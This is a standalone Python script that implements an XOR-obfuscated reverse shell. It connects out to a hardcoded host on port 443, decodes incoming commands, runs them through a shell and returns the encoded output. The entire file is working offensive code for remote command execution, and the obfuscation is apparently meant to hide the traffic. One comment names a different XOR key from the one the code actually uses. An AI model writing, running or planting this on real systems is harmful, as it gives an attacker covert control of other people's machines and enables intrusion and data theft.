#!/usr/bin/env python3
import os
import socket
import subprocess
import sys

rhost = '192.168.17.1'
rport = 443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((rhost, rport))

while True:
    # receive xor encoded data(type byte) from network socket
    data = s.recv(1024)
    
    # xor the data again with a 'x41' to get back to normal data
    # turn byte to bytearray made it be mutable
    en_data = bytearray(data)

    for i in range(len(en_data)):
        en_data[i] ^= 0x87

    # decode byte to string
    decode_data = en_data.decode('utf-8')
        
    comm = subprocess.Popen(decode_data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    STDOUT, STDERR = comm.communicate()

    return_data = STDOUT if STDOUT else STDERR
        
    # encode the output and send to rhost
    byte_arr_stdout = bytearray(return_data)
    for i in range(len(byte_arr_stdout)):
        byte_arr_stdout[i] ^= 0x87

    s.send(byte_arr_stdout)

s.close()
